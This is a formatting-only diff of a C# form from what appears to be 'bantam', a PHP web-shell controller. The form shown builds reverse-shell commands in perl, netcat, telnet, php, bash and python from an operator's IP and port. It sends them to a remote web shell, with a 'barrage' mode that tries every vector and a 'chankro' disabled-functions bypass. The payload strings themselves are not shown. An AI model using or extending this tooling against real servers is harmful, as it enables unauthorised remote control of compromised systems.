@@ -38,8 +38,7 @@ namespace bantam.Forms
 
             ShellUrl = shellUrl;
 
-            foreach (var vecs in shellVectors)
-            {
+            foreach (var vecs in shellVectors) {
                 comboBoxMethod.Items.Add(vecs);
             }
 
@@ -206,8 +205,7 @@ namespace bantam.Forms
             string phpCode = PhpBuilder.ExecuteSystemCode(shellCode, false);
             await Task.Run(() => WebRequestHelper.ExecuteRemotePHP(ShellUrl, phpCode, true).ConfigureAwait(false));
 
-            if (checkBoxLogShellCode.Checked)
-            {
+            if (checkBoxLogShellCode.Checked) {
                 LogHelper.AddShellLog(ShellUrl, "Attempted to pop chankro reverse shell with [ " + shellCode + " ] ", LogHelper.LOG_LEVEL.REQUESTED);
             }
         }
@@ -232,97 +230,85 @@ namespace bantam.Forms
             string ipv4 = Helper.MinifyCode(textBoxIP.Text);
 
             if (string.IsNullOrEmpty(ipv4)
-            || !Helper.IsValidIPv4(ipv4))
-            {
+            || !Helper.IsValidIPv4(ipv4)) {
                 lblStatus.Text = "Invalid ipv4...";
                 return;
             }
 
             string port = textBoxPort.Text;
 
-            if (string.IsNullOrEmpty(port))
-            {
+            if (string.IsNullOrEmpty(port)) {
                 lblStatus.Text = "Invalid port...";
                 return;
             }
 
-            switch (comboBoxMethod.Text)
-            {
+            switch (comboBoxMethod.Text) {
                 case "perl":
-                    shellCode = PerlShell(ipv4, port);
-                    break;
+                shellCode = PerlShell(ipv4, port);
+                break;
                 case "netcat":
-                    shellCode = NetCatShell(ipv4, port);
-                    break;
+                shellCode = NetCatShell(ipv4, port);
+                break;
                 case "netcat with pipe":
-                    shellCode = NetCatPipeShell(ipv4, port);
-                    break;
+                shellCode = NetCatPipeShell(ipv4, port);
+                break;
                 case "telnet with pipe":
-                    shellCode = TelNetPipeShell(ipv4, port);
-                    break;
+                shellCode = TelNetPipeShell(ipv4, port);
+                break;
                 case "php":
-                    shellCode = PhpShell(ipv4, port);
-                    break;
+                shellCode = PhpShell(ipv4, port);
+                break;
                 case "bash":
-                    shellCode = BashShell(ipv4, port);
-                    break;
+                shellCode = BashShell(ipv4, port);
+                break;
                 case "python":
-                    shellCode = PythonShell(ipv4, port);
-                    break;
+                shellCode = PythonShell(ipv4, port);
+                break;
                 case "barrage":
-                    if (checkBoxDisabledFunctionsBypass.Checked)
-                    {
-                        lblStatus.Text = "Barrage is not supported with chankro...";
-                        return;
-                    }
-
-                    shellCode = PerlShell(ipv4, port);
-                    PopReverseShell(shellCode);
-
-                    shellCode = NetCatShell(ipv4, port);
-                    PopReverseShell(shellCode);
-
-                    shellCode = NetCatPipeShell(ipv4, port);
-                    PopReverseShell(shellCode);
-
-                    shellCode = TelNetPipeShell(ipv4, port);
-                    PopReverseShell(shellCode);
-
-                    shellCode = PhpShell(ipv4, port);
-                    PopReverseShell(shellCode);
-
-                    shellCode = BashShell(ipv4, port);
-                    PopReverseShell(shellCode);
-
-                    shellCode = PythonShell(ipv4, port);
-                    PopReverseShell(shellCode);
-
-                    lblStatus.Text = "Goodluck! :D";
+                if (checkBoxDisabledFunctionsBypass.Checked) {
+                    lblStatus.Text = "Barrage is not supported with chankro...";
                     return;
+                }
+
+                shellCode = PerlShell(ipv4, port);
+                PopReverseShell(shellCode);
+
+                shellCode = NetCatShell(ipv4, port);
+                PopReverseShell(shellCode);
+
+                shellCode = NetCatPipeShell(ipv4, port);
+                PopReverseShell(shellCode);
+
+                shellCode = TelNetPipeShell(ipv4, port);
+                PopReverseShell(shellCode);
+
+                shellCode = PhpShell(ipv4, port);
+                PopReverseShell(shellCode);
+
+                shellCode = BashShell(ipv4, port);
+                PopReverseShell(shellCode);
+
+                shellCode = PythonShell(ipv4, port);
+                PopReverseShell(shellCode);
+
+                lblStatus.Text = "Goodluck! :D";
+                return;
                 default:
-                    lblStatus.Text = "Unknown shell vector, GUI Error";
-                    break;
+                lblStatus.Text = "Unknown shell vector, GUI Error";
+                break;
             }
 
-            if (checkBoxDisabledFunctionsBypass.Checked)
-            {
+            if (checkBoxDisabledFunctionsBypass.Checked) {
                 shellCode = Helper.EncodeBase64ToString(shellCode);
 
-                if (comboBoxArch.Text == "x86")
-                {
+                if (comboBoxArch.Text == "x86") {
                     PopChankroShell(Chankro32BitShell(shellCode));
-                }
-                else if (comboBoxArch.Text == "x64")
-                {
+                } else if (comboBoxArch.Text == "x64") {
                     PopChankroShell(Chankro64BitShell(shellCode));
-                }
-                else
-                {
+                } else {
                     lblStatus.Text = "Unknown chankro architecture vector, GUI Error";
                 }
-            }
-            else
-            {
+            } else {
                 PopReverseShell(shellCode);
             }
             lblStatus.Text = "Goodluck! :D";
@@ -337,14 +323,10 @@ namespace bantam.Forms
         {
             var task = WebRequestHelper.GetRequest("http://ipv4bot.whatismyipaddress.com/");
 
-            if (await Task.WhenAny(task, Task.Delay(Config.TimeoutMS)) == task)
-            {
-                if (string.IsNullOrEmpty(task.Result))
-                {
+            if (await Task.WhenAny(task, Task.Delay(Config.TimeoutMS)) == task) {
+                if (string.IsNullOrEmpty(task.Result)) {
                     MessageBox.Show("Unable to get IP Address", "Connection Failed");
-                }
-                else
-                {
+                } else {
                     textBoxIP.Text = task.Result;
                 }
             }
@@ -357,8 +339,7 @@ namespace bantam.Forms
         /// <param name="e"></param>
         private void textBoxPort_KeyPress(object sender, KeyPressEventArgs e)
         {
-            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar))
-            {
+            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
                 e.Handled = true;
             }
         }
@@ -370,15 +351,12 @@ namespace bantam.Forms
         /// <param name="e"></param>
         private void checkBoxDisabledFunctionsBypass_CheckedChanged(object sender, EventArgs e)
         {
-            if (checkBoxDisabledFunctionsBypass.Checked)
-            {
+            if (checkBoxDisabledFunctionsBypass.Checked) {
                 MessageBox.Show("You should only use this if all process execution methods are disabled, it can could potentially cause a fork bomb or other undesirable results.\r\r" +
                                 "Furthermore the web_root must be writeable, and you may need to perform cleanup in that directory", "Warning!!!");
 
                 comboBoxArch.Enabled = true;
-            }
-            else
-            {
+            } else {
                 comboBoxArch.Enabled = false;
             }
         }
